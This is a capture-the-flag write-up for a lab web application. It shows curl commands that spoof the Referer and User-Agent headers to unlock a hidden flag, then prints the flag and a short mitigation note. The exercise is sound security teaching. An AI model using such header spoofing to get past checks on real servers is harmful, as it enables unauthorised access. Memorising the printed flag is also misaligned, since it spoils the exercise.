# Custom curl request with evil headers

## How we found the breach

After inspecting the page: `http://192.168.56.101/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f` several suspicious html comments can be found inside it.

```html
<!--
You must come from : "https://www.nsa.gov/".
-->

<!--
Let's use this browser : "ft_bornToSec". It will help you a lot.
-->
```

The first one suggests that we're coming from a specific url, well then lets just try it.

## Custom curl Referrer header

We will use `curl` to perform our requests, using `curl --header "Header_foo: bar"` we can define custom header key value pairs.
Also we will make a diff on the fly of the default page versus our custom curl.
First the `Referrer` header using `curl --header "Referer: https://www.nsa.gov/" url`.

```bash
diff <(curl --silent "http://192.168.56.101/index.php?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f") <(curl --silent --header "Referer: https://www.nsa.gov/" "http://192.168.56.101/index.php?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f")
37c37
< <audio id="best_music_ever" src="audio/music.mp3"preload="true" loop="loop" autoplay="autoplay">
---
> FIRST STEP DONE<audio id="best_music_ever" src="audio/music.mp3"preload="true" loop="loop" autoplay="autoplay">
```

As we can see the server sent back a different page content `FIRST STEP DONE`
The second suspicious comment is talking about a browser, lets play with the `User-Agent` header.

## Custom curl User-Agent header

Lets take our previous step command and add custom header for the user agent, using `curl --header "User-Agent: browser"`.

```bash
diff <(curl --silent "http://192.168.56.101/index.php?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f") <(curl --silent --header "Referer: https://www.nsa.gov/" --header "User-Agent: ft_bornToSec" "http://192.168.56.101/index.php?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f")
37c37
< <audio id="best_music_ever" src="audio/music.mp3"preload="true" loop="loop" autoplay="autoplay">
---
> <center><h2 style="margin-top:50px;"> The flag is : f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center> <audio id="best_music_ever" src="audio/music.mp3"preload="true" loop="loop" autoplay="autoplay">
```

There we go ! In the returned page we can find the flag !

## How to exploit the breach

If the server makes assertions on the headers of the request, then depending on the resulting operations can be really risky if any transaction or authentication is involved.

## How to avoid the breach

As for everything that builds a request, specfic headers can be set manually by an hacker.
To avoid such security issue, the server should not be making high risky assertion depending on the request's header.
